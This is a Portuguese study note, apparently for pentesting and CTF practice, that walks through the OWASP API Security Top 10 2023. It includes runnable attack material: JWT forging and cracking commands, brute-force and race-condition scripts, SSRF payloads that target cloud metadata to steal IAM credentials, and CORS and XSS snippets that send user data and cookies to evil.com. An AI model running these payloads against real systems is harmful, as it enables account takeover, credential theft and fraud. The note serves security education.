# 🔌 OWASP API Security Top 10 — 2023

> APIs expõem lógica de negócio e dados de forma direta — são a superfície de ataque mais crítica em aplicações modernas. O OWASP API Top 10 documenta as falhas mais frequentes e impactantes em APIs REST, GraphQL, gRPC e similares.
> Relacionado: [[Essential Web Hacking]] [[Payloads - Web Hacking]]

---

## Por que APIs são diferentes de aplicações web tradicionais?

APIs foram projetadas para serem consumidas por máquinas — não por humanos. Isso muda completamente o modelo de ameaça:

- **Sem interface humana para validar intenção** — não há CAPTCHA, não há campo "visível" limitado, não há UX que filtre o que o usuário pode tentar.
- **Retornam dados estruturados (JSON/XML)** — muito mais fáceis de automatizar ataques e parsear respostas.
- **São o backbone de mobile apps, SPAs e integrações B2B** — comprometer uma API compromete todos os clientes ao mesmo tempo.
- **Frequentemente têm menos controles de segurança** — desenvolvidas com foco em velocidade, documentação e integração, raramente com threat modeling.

**Metodologia de teste de API:**
1. Mapear endpoints (Swagger/OpenAPI, arquivos JS, histórico do Burp)
2. Autenticar e coletar tokens de diferentes roles (user, admin, guest)
3. Testar cada endpoint com todos os roles e sem autenticação
4. Variar métodos HTTP (GET → POST → PUT → DELETE → PATCH)
5. Manipular IDs, campos, tipos e operadores em cada parâmetro

---

## API1:2023 — Broken Object Level Authorization (BOLA / IDOR)

> **O que é:** A API aceita um ID de objeto no request (ex: `/api/users/42/profile`) e não verifica se o usuário autenticado tem **permissão** para acessar aquele objeto específico. É essencialmente IDOR no contexto de API.

**Por que acontece:** O desenvolvedor implementa autenticação (quem você é), mas esquece a autorização (o que você pode acessar). A API confia no ID fornecido sem cruzar com a sessão ativa.

**Analogia:** Você tem a chave do apartamento 42, mas a portaria deixa você entrar em qualquer apartamento só porque você tem *uma* chave.

### Fluxo de ataque

```
1. Autenticar como Usuário A → obter token JWT/session
2. Observar um request legítimo: GET /api/orders/1001
3. Trocar o ID: GET /api/orders/1002, 1003, 1004...
4. Se a API retornar dados de outros usuários → BOLA confirmado
```

### Onde procurar

- IDs numéricos sequenciais em endpoints (`/orders/1337`, `/invoices/99`, `/users/42`)
- UUIDs em parâmetros de path ou query string — UUIDv1 tem componente de tempo, portanto previsível
- Campos de ID em body de requisições POST/PUT
- Referências cruzadas entre recursos (`/api/users/42/payments`, `/api/accounts/7/statements`)
- IDs em headers customizados (`X-User-Id`, `X-Account-Id`)
- Referências em downloads (`/api/export?report_id=55`)

### Variações menos óbvias

```
# BOLA em método não-destrutivo (GET) — fácil de ignorar em triage
GET /api/v1/messages/9912  → retorna mensagem privada de outro usuário

# BOLA em operação destrutiva (DELETE)
DELETE /api/posts/4422     → deleta post de outro usuário

# BOLA via body (ID não está na URL, está no JSON)
POST /api/transfer
{ "from_account": 1, "to_account": 2, "amount": 100 }
↓ Trocar "from_account" para ID de outra conta → transferência não autorizada

# BOLA em resposta (objeto retorna mais do que deveria)
GET /api/users/me → retorna { "id": 42, "role": "user", "internal_score": 9.8, "password_hash": "..." }
```

### Como explorar com ffuf/Burp

```bash
# Enumerar IDs com ffuf
ffuf -u https://api.alvo.com/api/orders/FUZZ \
     -w <(seq 1 1000) \
     -H "Authorization: Bearer SEU_TOKEN" \
     -mc 200 \
     -o bola_results.json

# Burp Intruder: marcar o ID como payload position, usar lista numérica
# Comparar respostas: tamanho diferente = dado diferente = BOLA
```

**Impacto:** Leitura, modificação ou exclusão de dados de qualquer usuário. Dependendo do endpoint, pode levar a account takeover, vazamento de dados em massa, fraude financeira.

> **Dica CTF:** Sempre que ver um número em uma URL de API, troque para outros valores. UUIDs são previsíveis em implementações fracas — UUIDv1 deriva do timestamp e MAC address da máquina.

---

## API2:2023 — Broken Authentication

> **O que é:** Mecanismos de autenticação implementados de forma incorreta, permitindo que atacantes comprometam tokens, senhas ou sessões para assumir identidade de outros usuários.

**Por que acontece:** APIs são frequentemente desenvolvidas com foco em funcionalidade. Controles como rate limiting, expiração de tokens e rotação de secrets são tratados como "detalhes" para depois — que frequentemente não chegam.

### Vetores comuns

| Vetor | Descrição | Como testar |
|---|---|---|
| Credential stuffing | Testar pares usuário/senha vazados de outros serviços | Usar listas do HaveIBeenPwned + Hydra/ffuf |
| Brute force sem rate limit | API não bloqueia tentativas excessivas | Enviar 100+ requests de login em sequência |
| JWTs com `alg: none` | Token aceito sem assinatura | Trocar o header e remover a assinatura |
| Secrets JWT fracos | HS256 com secret previsível | Hashcat com wordlist de secrets comuns |
| Key confusion (RS256→HS256) | Assinar com chave pública como secret HMAC | jwt_tool, jwt-heartbreaker |
| Tokens sem expiração | Token emitido uma vez, válido para sempre | Verificar campo `exp` no JWT |
| Token em query string | `/api/data?token=XXX` → exposto em logs, Referer | Inspecionar URLs e histórico |
| Reset de senha inseguro | Token de reset previsível, reutilizável, sem expiração | Solicitar 10 resets e analisar padrão dos tokens |
| Endpoint de login sem lockout | Tentativas ilimitadas | Burp Intruder com lista de senhas |

### Ataques JWT detalhados

```bash
# 1. Decodificar JWT (sem verificar assinatura)
echo "HEADER.PAYLOAD.SIGNATURE" | cut -d. -f2 | base64 -d 2>/dev/null

# 2. Ataque alg:none — remover verificação de assinatura
# Header original: {"alg":"HS256","typ":"JWT"}
# Header modificado: {"alg":"none","typ":"JWT"}
# Signature: vazia (string vazia após o último ponto)
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = 'PAYLOAD_BASE64_ORIGINAL'
print(f'{header}.{payload}.')
"

# 3. Brute force do secret com hashcat
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# 4. jwt_tool — canivete suíço para ataques JWT
pip install jwt_tool
jwt_tool TOKEN -T           # Tamper mode interativo
jwt_tool TOKEN -X a         # alg:none
jwt_tool TOKEN -X s         # Brute force do secret
jwt_tool TOKEN -X k -pk public.pem  # Key confusion (RS256→HS256)
```

### Teste de rate limiting

```python
import requests, time

url = "https://api.alvo.com/auth/login"
headers = {"Content-Type": "application/json"}

for i in range(100):
    r = requests.post(url, json={"username": "admin", "password": f"senha{i}"}, headers=headers)
    print(f"[{i}] Status: {r.status_code} | Resp: {r.text[:80]}")
    # Se nunca retornar 429 ou bloquear → sem rate limiting
```

> **Em hacking:** Broken Authentication é o caminho mais direto para account takeover. Sempre que encontrar um JWT, inspecione o header `alg`, verifique a expiração (`exp`) e tente `alg: none`. Cheque se o endpoint de login aceita 1000 tentativas sem bloqueio. Um secret JWT fraco com hashcat e rockyou.txt resolve em segundos.

---

## API3:2023 — Broken Object Property Level Authorization (BOPLA)

> **O que é:** Evolução do BOLA — aqui o problema não é acessar o objeto errado, mas acessar ou modificar **propriedades específicas** do objeto que deveriam ser restritas. Engloba dois padrões distintos: **Excessive Data Exposure** e **Mass Assignment**.

### Excessive Data Exposure

A API retorna mais dados do que o necessário, delegando ao cliente a responsabilidade de filtrar. O front-end só exibe alguns campos, mas a API retorna todos — incluindo dados sensíveis que o desenvolvedor "esqueceu" de remover.

**Exemplo real:**
```json
GET /api/users/42

// Resposta da API (o que você realmente recebe):
{
  "id": 42,
  "name": "Gabriel",
  "email": "gabriel@email.com",
  "password_hash": "$2b$12$...",
  "is_admin": false,
  "internal_credit_score": 850,
  "stripe_customer_id": "cus_XXX",
  "two_factor_secret": "JBSWY3DPEHPK3PXP",
  "reset_token": "abc123xyz",
  "created_at": "2024-01-01"
}

// O front-end só renderiza: name, email → mas TUDO foi transmitido
```

**Como encontrar:**
- Inspecionar todas as respostas da API no Burp Suite (aba Response)
- Comparar campos retornados vs campos exibidos na UI
- Prestar atenção em objetos aninhados — muitas vezes a API retorna um objeto com sub-objeto sensível
- Endpoints de listagem (`GET /api/users`) frequentemente retornam mais campos que o detalhe individual

### Mass Assignment

A API aceita qualquer campo no body do request e os aplica diretamente ao objeto/modelo — sem allowlist. O atacante envia campos que não deveria poder modificar.

**Exploração passo a passo:**
```
1. Fazer GET /api/users/42 → mapear todos os campos retornados
   { "id": 42, "name": "Gabriel", "role": "user", "is_admin": false, "balance": 100.00 }

2. Tentar PATCH /api/users/42 com campos extras:
   { "name": "Gabriel", "role": "admin", "is_admin": true, "balance": 999999.99 }

3. Fazer GET /api/users/42 novamente → ver se os campos foram aceitos

4. Se is_admin virou true → Mass Assignment confirmado → escalada de privilégio
```

**Campos sensíveis para sempre tentar:**
```json
{
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "email_verified": true,
  "subscription": "premium",
  "balance": 99999,
  "credits": 99999,
  "account_type": "enterprise",
  "permissions": ["read", "write", "admin"],
  "group_id": 1
}
```

**Encontrar campos via documentação/JS:**
```bash
# Buscar campos em arquivos JS do front-end
grep -r "is_admin\|role\|balance\|subscription" /path/to/js/
# Ou usar SecretFinder/LinkFinder em arquivos JS remotos
```

---

## API4:2023 — Unrestricted Resource Consumption

> **O que é:** A API não limita o volume, frequência ou tamanho dos requests. Pode ser explorada para DoS, abuso de custos em serviços cloud, ou para amplificar ataques de brute force.

**Por que acontece:** Rate limiting é considerado "infraestrutura" — responsabilidade do time de DevOps/SRE, não do time de desenvolvimento da API. Resultado: ninguém implementa.

### Vetores detalhados

| Vetor | Impacto | Como testar |
|---|---|---|
| Sem rate limiting em login | Brute force ilimitado | 1000 requests de login em sequência |
| Sem paginação | Dump completo do banco | `?limit=999999` ou `?page_size=0` |
| Upload sem limite de tamanho | Consumo de storage/CPU/memória | Upload de arquivo de 1GB |
| Operações custosas sem throttle | Custo cloud explodindo (OCR, ML, video) | Chamar o endpoint em loop |
| Parâmetro de quantidade controlável | Spam em massa, custo de notificações | `{"send_to": 9999}` |
| Requisições aninhadas GraphQL | CPU bomb no servidor | Query com profundidade 100+ |
| Regex complexos em input | ReDoS — CPU em 100% | Input com backtracking catastrófico |

### Testando limites de rate

```bash
# Testar se existe rate limiting com wrk
wrk -t10 -c100 -d10s https://api.alvo.com/api/login

# Verificar headers de rate limit na resposta
curl -I https://api.alvo.com/api/data | grep -i "ratelimit\|retry-after\|x-rate"
# Headers esperados: X-RateLimit-Limit, X-RateLimit-Remaining, Retry-After

# Testar parâmetro de tamanho de página
curl -H "Authorization: Bearer TOKEN" \
     "https://api.alvo.com/api/users?limit=999999&offset=0"
```

### GraphQL — Query Batching e Nested Queries (DoS)

```graphql
# Query batching — executar 1000 operações em 1 request
[
  { "query": "{ user(id: 1) { name email } }" },
  { "query": "{ user(id: 2) { name email } }" }
]
# Repetir até 1000 queries no mesmo array

# Nested query profunda — CPU bomb
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            name email posts { comments { author { name } } }
          }
        }
      }
    }
  }
}
```

---

## API5:2023 — Broken Function Level Authorization (BFLA)

> **O que é:** A API não verifica se o usuário tem **permissão para chamar aquela função/endpoint** — não o objeto em si, mas a operação. Um usuário comum consegue chamar endpoints administrativos.

**Diferença crítica entre BOLA e BFLA:**
- **BOLA:** Você pode chamar o endpoint certo, mas acessa objeto errado → `GET /api/users/OUTRO_ID`
- **BFLA:** Você não deveria nem poder chamar o endpoint → `DELETE /api/admin/users/42`

### Metodologia de descoberta de endpoints admin

```bash
# 1. Mapear todos os endpoints da aplicação
# Via Burp Suite: ativar proxy, navegar pela aplicação inteira, exportar histórico
# Via arquivos JS: extrair endpoints com LinkFinder
python3 linkfinder.py -i https://alvo.com/app.js -o cli

# 2. Buscar endpoints com prefixos administrativos
ffuf -u https://api.alvo.com/FUZZ \
     -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
     -H "Authorization: Bearer USER_TOKEN" \
     -mc 200,201,301,302,403 \
     -o endpoints.json

# Prefixos para sempre tentar: /admin/, /internal/, /manage/, /staff/,
# /superuser/, /debug/, /system/, /ops/, /v0/, /private/

# 3. Trocar método HTTP em endpoints conhecidos
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    echo "=== $method ==="
    curl -X $method -H "Authorization: Bearer USER_TOKEN" \
         https://api.alvo.com/api/users -s -o /dev/null -w "%{http_code}\n"
done
```

### Padrões de BFLA mais comuns

```
# Endpoint admin sem verificação de role
GET  /api/admin/users        → lista todos os usuários (deveria ser só admin)
POST /api/admin/users        → criar usuário com role arbitrária
DELETE /api/admin/users/42   → deletar qualquer usuário

# Endpoint de gerenciamento de features
POST /api/features/enable
{ "feature": "premium", "user_id": 99 }

# Ações destrutivas sem autorização
POST /api/users/42/ban       → banir outro usuário com token de user comum

# APIs mobile vs web — mobile frequentemente expõe mais endpoints
# Capturar tráfego do app mobile com Burp + proxy no emulador
```

### Teste de escalada horizontal e vertical

```
Escalada Horizontal: User A acessa recursos de User B (mesmo role)
  → Trocar user_id, account_id nos parâmetros

Escalada Vertical: User comum acessa funcionalidade de Admin
  → Testar endpoints /admin/, /manage/, operações destrutivas

Dupla escalada: Combinar BOLA + BFLA
  → Chamar endpoint admin (BFLA) com ID de outro usuário (BOLA)
  → DELETE /api/admin/users/OUTRO_ID com token de usuário comum
```

> **Dica:** Mobile apps costumam expor mais endpoints que o site web — sempre teste o APK/IPA com Burp configurado como proxy no emulador Android.

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

> **O que é:** A API expõe um fluxo de negócio crítico sem proteções adequadas contra abuso automatizado. Não é uma falha de código clássica — é a ausência de controles contra uso ilegítimo em escala.

**Diferença para os outros itens:** Aqui a API está funcionando "corretamente" do ponto de vista técnico — não há bug de autorização ou autenticação. O problema é que ela permite executar ações de negócio sensíveis sem limitação ou validação de intenção.

### Exemplos de fluxos vulneráveis

| Fluxo | Abuso | Impacto |
|---|---|---|
| Cupom de desconto | Usar o mesmo cupom infinitas vezes via automação | Perda financeira |
| Sistema de referral/indicação | Criar contas fake para ganhar créditos | Fraude |
| "Comprar antes do lançamento" | Bot que reserva todos os itens limitados | Mercado paralelo |
| Votação/rating | Inflar avaliações automaticamente | Manipulação de ranking |
| Formulário de contato | Spam massivo via API | Abuso de infraestrutura |
| Criação de conta free | Criar 10.000 contas para usar trial infinitamente | Perda de receita |
| Webhook de pagamento | Replay de evento de pagamento confirmado | Fraude financeira |

### Script de abuso de fluxo (exemplo — cupom de desconto com race condition)

```python
import requests
import threading

url = "https://api.alvo.com/api/orders/apply-coupon"
headers = {
    "Authorization": "Bearer SEU_TOKEN",
    "Content-Type": "application/json"
}

def aplicar_cupom():
    r = requests.post(url, json={"coupon_code": "DESC50", "order_id": 9912}, headers=headers)
    print(f"Status: {r.status_code} | {r.json()}")

# Disparar 20 requests simultâneos — explorar race condition no fluxo
threads = [threading.Thread(target=aplicar_cupom) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### Identificação em pentest

```bash
# Verificar se há CAPTCHA na requisição de criação de conta
curl -X POST https://api.alvo.com/api/register \
     -H "Content-Type: application/json" \
     -d '{"email":"test@test.com","password":"Senha123!"}' -v
# Se aceitar sem captcha_token → automação possível

# Testar replay de webhook (webhook sem timestamp validation)
# Capturar um webhook legítimo com Burp e reenviar 10x
# Se processar 10x → Business Flow Abuse confirmado

# Verificar se endpoint de checkout tem idempotency key obrigatória
# Sem idempotency key → possível duplicate charge / duplicate coupon
```

---

## API7:2023 — Server-Side Request Forgery (SSRF)

> **O que é:** A API faz requisições HTTP para URLs fornecidas pelo usuário sem validar o destino. O atacante pode fazer o servidor acessar recursos internos da rede, metadata de cloud, ou serviços não expostos externamente.

### Como funciona

```
Fluxo legítimo:
  Usuário → POST /api/fetch-url {"url": "https://imagem.publica.com/foto.jpg"}
  Servidor → faz requisição para imagem.publica.com → retorna imagem

Fluxo malicioso:
  Atacante → POST /api/fetch-url {"url": "http://169.254.169.254/latest/meta-data/"}
  Servidor → faz requisição para o metadata service da AWS EC2
  Resposta → credenciais IAM, chaves de acesso, informações da instância
```

### Alvos clássicos

| Alvo | URL | O que retorna |
|---|---|---|
| Metadata AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | Info da instância, roles IAM |
| Credenciais IAM AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE` | AccessKeyId, SecretAccessKey, Token |
| Metadata GCP | `http://metadata.google.internal/computeMetadata/v1/` + header `Metadata-Flavor: Google` | Service accounts, tokens |
| Metadata Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + header `Metadata: true` | Subscription, resource group, tokens |
| Serviços internos | `http://localhost:8080/admin`, `http://192.168.1.1/` | Painéis internos, APIs privadas |
| Redis interno | `http://localhost:6379/` | Possível leitura de dados em cache |
| Arquivo local | `file:///etc/passwd` | Leitura de arquivos do servidor |
| Outros protocolos | `dict://`, `gopher://`, `ftp://` | Interagir com outros serviços internos |

### Onde procurar parâmetros de URL

```
Parâmetros mais comuns para testar SSRF:
url, callback, redirect, next, return, goto, webhook, avatar,
import, fetch, pull, load, download, src, source, endpoint,
proxy, forward, link, target, image_url, pdf_url, report_url
```

```bash
# Exemplo de teste
curl -X POST https://api.alvo.com/api/profile/avatar \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

### Bypass de filtros SSRF

```
# Se a API bloqueia 169.254.169.254:
http://[::ffff:169.254.169.254]     → IPv6
http://0251.0376.0251.0376          → octal
http://0xa9fea9fe                   → hexadecimal
http://2852039166                   → decimal
http://169.254.169.254.nip.io       → DNS rebinding
http://localtest.me                 → resolve para 127.0.0.1

# Redirecionamento aberto para bypass (Open Redirect + SSRF)
# Se a API segue redirecionamentos:
url=https://alvo.com/redirect?url=http://169.254.169.254/
→ A API valida o domínio alvo.com mas segue o redirect para o IP interno
```

### Exploração de credenciais IAM (IMDSv1)

```bash
# 1. Descobrir roles IAM disponíveis
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Obter credenciais temporárias da role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME_DA_ROLE
# Retorna: AccessKeyId, SecretAccessKey, Token, Expiration

# 3. Usar as credenciais com AWS CLI
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
aws s3 ls
aws secretsmanager list-secrets
```

> **Em hacking:** IMDSv2 (versão nova da AWS) requer um header `X-aws-ec2-metadata-token` obtido via PUT antes de qualquer requisição — não funciona com GET simples. Mas muitas instâncias ainda usam IMDSv1. Sempre tente o endpoint de metadata primeiro.

---

## API8:2023 — Security Misconfiguration

> **O que é:** A API está configurada de forma insegura — não é uma falha de lógica de código, mas de configuração do ambiente, servidor ou framework.

### CORS aberto

```bash
# Checar CORS
curl -H "Origin: https://evil.com" -I https://api.alvo.com/api/data
# Se retornar: Access-Control-Allow-Origin: https://evil.com  →  CORS misconfigured
# Se retornar: Access-Control-Allow-Credentials: true  →  crítico (requests autenticados)
```

**Exploit de CORS misconfiguration (hospedar em evil.com):**
```html
<script>
fetch('https://api.alvo.com/api/users/me', {
    credentials: 'include'  // Envia cookies automaticamente
})
.then(r => r.json())
.then(data => {
    fetch('https://evil.com/collect?data=' + JSON.stringify(data));
});
</script>
```

### Swagger/OpenAPI exposto em produção

```bash
ffuf -u https://api.alvo.com/FUZZ \
     -w SecLists/Discovery/Web-Content/api/openapi.txt \
     -mc 200

# Paths mais comuns:
# /swagger, /swagger-ui, /swagger-ui.html, /swagger.json, /swagger.yaml
# /api-docs, /api/docs, /openapi, /openapi.json, /openapi.yaml
# /v1/docs, /v2/docs, /api/v1/swagger.json, /redoc
```

**O que fazer quando encontrar Swagger:**
1. Mapear todos os endpoints documentados (incluindo os não linkados no front-end)
2. Identificar endpoints marcados como "admin", "internal", "deprecated"
3. Copiar o schema de cada endpoint — saber exatamente quais campos são aceitos
4. Usar o próprio Swagger UI para fazer requisições autenticadas com token válido
5. Tentar endpoints sem autenticação primeiro

### Headers de segurança ausentes

```bash
# Verificar headers de segurança
curl -I https://api.alvo.com/api/data | grep -i \
  "strict-transport\|x-content-type\|x-frame\|content-security\|permissions-policy"

# Headers que deveriam estar presentes:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Content-Security-Policy: ...
# Cache-Control: no-store (para endpoints autenticados)
```

### Métodos HTTP desnecessários e stack traces

```bash
# Checar métodos permitidos
curl -X OPTIONS -I https://api.alvo.com/api/users
# TRACE habilitado → possível XST (Cross-Site Tracing) para roubar cookies HttpOnly

# Provocar erros intencionalmente para ver stack traces
curl https://api.alvo.com/api/users/INVALIDO\'
curl https://api.alvo.com/api/users/-1
curl -X POST https://api.alvo.com/api/login -d '{"malformed": json'

# Stack trace pode revelar: linguagem, versão, framework, paths internos,
# queries SQL com estrutura da tabela, variáveis de ambiente
```

---

## API9:2023 — Improper Inventory Management

> **O que é:** A organização não tem controle do inventário de suas APIs — versões antigas continuam ativas, endpoints de debug/teste ficam em produção, APIs de terceiros não são monitoradas.

### Por que acontece

APIs têm ciclos de vida longos. A v1 foi lançada com menos controles. A v3 foi lançada com autenticação forte, rate limiting e validação. A v1 "ainda funciona" e está esquecida — mas qualquer um que descobrir o endpoint antigo entra sem as proteções novas.

### Como descobrir versões e endpoints esquecidos

```bash
# 1. Buscar versões de API
ffuf -u https://api.alvo.com/FUZZ/users \
     -w <(echo -e "v1\nv2\nv3\nv1.0\nv2.0\napi/v1\nrest/v1\napi/v1.0") \
     -H "Authorization: Bearer TOKEN" \
     -mc 200,201,403

# 2. Buscar endpoints de debug/test/admin esquecidos
ffuf -u https://api.alvo.com/api/FUZZ \
     -w SecLists/Discovery/Web-Content/api/objects.txt \
     -H "Authorization: Bearer TOKEN" \
     -mc 200,201,403

# 3. Comparar endpoints de staging vs produção
# Staging: api-staging.alvo.com ou staging.api.alvo.com
# O staging pode ter menos controles e dados reais

# 4. Analisar versões antigas nos arquivos JS
grep -r "api/v1\|/v1/\|/v0/" /path/to/js/
```

### Wordlist de endpoints sensíveis esquecidos

```
/api/debug
/api/test
/api/internal
/api/admin/debug
/api/health/full
/api/metrics
/api/actuator          ← Spring Boot (Java)
/api/actuator/env      ← expõe variáveis de ambiente e secrets
/api/actuator/beans
/api/actuator/mappings
/api/__debug__
/api/dev
/api/console
/api/phpinfo
```

> **Dica:** O endpoint `/api/actuator` é específico de Spring Boot (Java). Se encontrar, acesse `/actuator/env` — pode expor variáveis de ambiente, incluindo secrets e strings de conexão de banco de dados.

---

## API10:2023 — Unsafe Consumption of APIs

> **O que é:** A aplicação consome APIs de terceiros de forma insegura — confia cegamente nos dados retornados sem validação, usa HTTP em vez de HTTPS, ou não verifica certificados. Um atacante que compromete ou faz MITM na API de terceiro pode injetar dados maliciosos.

### Cenários de ataque

```
Cenário 1 — SQLi Indireta via API de terceiro:
  Alvo → requisita dados de parceiro.com/api/users
  Parceiro retorna: [{"name": "'; DROP TABLE users; --", "id": 1}]
  Alvo insere o name em query SQL sem sanitizar → SQLi

Cenário 2 — XSS via API de terceiro:
  Alvo → carrega bio do usuário via /api/social/profile
  API retorna: {"bio": "<script>fetch('evil.com/'+document.cookie)</script>"}
  Alvo renderiza o HTML sem sanitizar → XSS stored

Cenário 3 — MITM em comunicação HTTP:
  Alvo → consome api.geo.com via HTTP (sem TLS)
  Atacante na mesma rede → intercepta e modifica a resposta
  Alvo processa dados alterados (coordenadas, endereços, preços)

Cenário 4 — Supply chain attack:
  Alvo usa SDK de analytics de terceiro
  SDK é comprometido (como o caso xz/liblzma ou PyPI packages)
  Todos os usuários do alvo são afetados
```

### Como identificar em pentest

```bash
# 1. Mapear todas as chamadas externas da aplicação
# No Burp Suite: filtrar requests para domínios externos (fora do escopo principal)
# Observar: api.stripe.com, api.mailgun.com, maps.googleapis.com, etc.

# 2. Verificar se a comunicação usa HTTPS
# Qualquer requisição HTTP sem TLS = vulnerável a MITM

# 3. Testar endpoint de webhook sem validação de origem/assinatura
curl -X POST https://api.alvo.com/api/webhooks/payment \
     -H "Content-Type: application/json" \
     -d '{"event": "payment.completed", "amount": 0.01, "order_id": 9999}'
# Se aceitar sem validar assinatura/secret do webhook → replay attack possível

# 4. Injeção nos dados via APIs que você controla
# Se o alvo consome dados de um webhook ou API que você controla:
# Retornar payloads de SQLi/XSS/Command Injection nos campos de texto
# Observar se o alvo processa os dados sem sanitização
```

---

## 📊 Resumo Rápido — API Top 10 2023

| # | Vulnerabilidade | Vetor Principal | Impacto | Ferramenta |
|---|---|---|---|---|
| API1 | BOLA | Trocar ID no endpoint | Acesso a dados de outros usuários | Burp Intruder, ffuf |
| API2 | Broken Authentication | Token fraco, sem rate limit | Comprometer contas | jwt_tool, hashcat, Burp |
| API3 | BOPLA | Campos extras no request | Escalada de privilégio, data leak | Burp Repeater |
| API4 | Resource Consumption | Sem rate limit/paginação | DoS, custo cloud, brute force | wrk, scripts Python |
| API5 | BFLA | Acessar endpoint admin | Operações não autorizadas | ffuf, Burp |
| API6 | Business Flow Abuse | Automação de fluxos críticos | Fraude, vantagem ilegítima | Scripts Python/threading |
| API7 | SSRF | URL controlada pelo usuário | Acesso à rede interna, metadados cloud | Burp, curl |
| API8 | Misconfiguration | CORS, Swagger exposto | Data exposure, CSRF cross-origin | curl, ffuf |
| API9 | Inventory Management | APIs/versões esquecidas | Bypass de controles modernos | ffuf, Burp |
| API10 | Unsafe API Consumption | Trust cego em APIs externas | SQLi/XSS indireta, supply chain | Burp (intercept webhooks) |

> **Metodologia de teste de API:** Sempre comece com [[Essential Web Hacking#Recon — Reconhecimento]] para mapear endpoints antes de testar. Use Burp Suite para interceptar e modificar requests. Documentação Swagger/OpenAPI exposta é o melhor ponto de partida — lista todos os endpoints, parâmetros e schemas.
